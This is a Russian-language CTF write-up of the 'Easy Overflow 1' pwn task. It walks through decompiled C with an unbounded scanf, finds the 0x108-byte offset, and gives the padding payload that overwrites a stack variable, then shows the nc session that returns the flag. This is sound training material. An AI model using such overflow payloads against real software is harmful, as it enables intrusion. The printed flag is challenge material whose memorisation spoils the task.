---
title: "Easy Overflow 1"
date: 2025-12-08
tags: [pwn, writeup]  
categories: [Pwn]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_Pwn/IMG_Pwn_Season/Pwn_Season_logo.jpg
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Pwn Season"
      url: "https://pwn.spbctf.ru/tasks/pwn1_mc4"
classes: half
layout: single
toc: true
toc_sticky: true
toc_label: "Оглавление"
---

Переполните, чтобы получить флаг.

- [ELF](https://pwn.spbctf.ru/files/overflow/mc4_censored)

```bash
nc 109.233.56.90 11584
```

# Solution

Так как я сейчас пробую использовать локальные `LLM` для реверса, то и тут не обойдусь без нее) Из задания понятно, что тут должно быть переполнение буфера.

```
[Default] 1. Buffer Overflow Vulnerability: The `scanf` function is vulnerable to buffer overflow attacks.  
The `%s` format specifier can read data from standard input and store it in a buffer, but it does not perform  
any bounds checking on the size of the input. This means that an attacker could provide malicious input that exceeds  
the size of the buffer, leading to a buffer overflow vulnerability.
```

Так оно и есть:

```c
  int32_t main()
  {
      int32_t result = 0;
      int32_t ans = 'No.';
      int64_t rax;
      (uint8_t)rax = 0;
      int32_t var_11c = printf("What's your favorite word? ");
      int32_t rax_1;
      (uint8_t)rax_1 = 0;
      void input_str;
      int32_t var_120 = scanf("%s", &input_str);
      int32_t rax_3;
      
      if (strcmp(&ans, "Yesss!"))
      {
          (uint8_t)rax_3 = 0;
          printf("Good, but i won't give you flag.\n");
      }
      else
      {
          (uint8_t)rax_3 = 0;
          printf("Flag is: spbctf{*********************}\n");
      }
      return result;
  }
```

`scanf` при считывание с клавиатуры `%s` строки не учитывает размер буфера. Таким образом, мы можем ввести сколько угодно символов с клавиатуры и этим перетереть другие значения. 

![IMG](/assets/images/IMG_writeups/IMG_Pwn/IMG_Pwn_Season/IMG_Easy_Overflow_1/1.png){: height="200" .align-center}

После ввода большой строки я перетер даже возврат:

![IMG](/assets/images/IMG_writeups/IMG_Pwn/IMG_Pwn_Season/IMG_Easy_Overflow_1/2.png){: height="200" .align-center}

Нам же нужно таким образом перетереть значение `No`. Если мы глянем на стек, то увидим, что если до переменной `ans` у нас есть `0x108` пусты ячеек:

![IMG](/assets/images/IMG_writeups/IMG_Pwn/IMG_Pwn_Season/IMG_Easy_Overflow_1/3.png){: height="200" .align-center}

значит нам нужно ввести 264(`0x108`) рандомных символов, за которыми последует `Yesss!`.

## Пейлоад

Мне нужно получить строку длиной `264 + len(Yesss!)`. Это легко можно сделать следующей питоновской строчкой:

```python
'Yesss!'.rjust(270, 'q')
```

А вот и мой пейлоад:

```
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqYesss!
```

После ввода пейлоада стек выглядит вот так (это можно посмотреть через `stack -f`):

![IMG](/assets/images/IMG_writeups/IMG_Pwn/IMG_Pwn_Season/IMG_Easy_Overflow_1/4.png){: height="200" .align-center}

Вызов `strcmp` происходит со следующими аргументами:

![IMG](/assets/images/IMG_writeups/IMG_Pwn/IMG_Pwn_Season/IMG_Easy_Overflow_1/5.png){: height="200" .align-center}

Выглядит супер. Проверю локально

![IMG](/assets/images/IMG_writeups/IMG_Pwn/IMG_Pwn_Season/IMG_Easy_Overflow_1/6.png){: height="200" .align-center}

Самое время получить флаг:

```bash
root@43fcfd6e3e23:/rev# nc 109.233.56.90 11584                                                                     
What's your favorite word? qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqYesss!
Flag is: spbctf{babys_f1rst_0verfl0ww}
```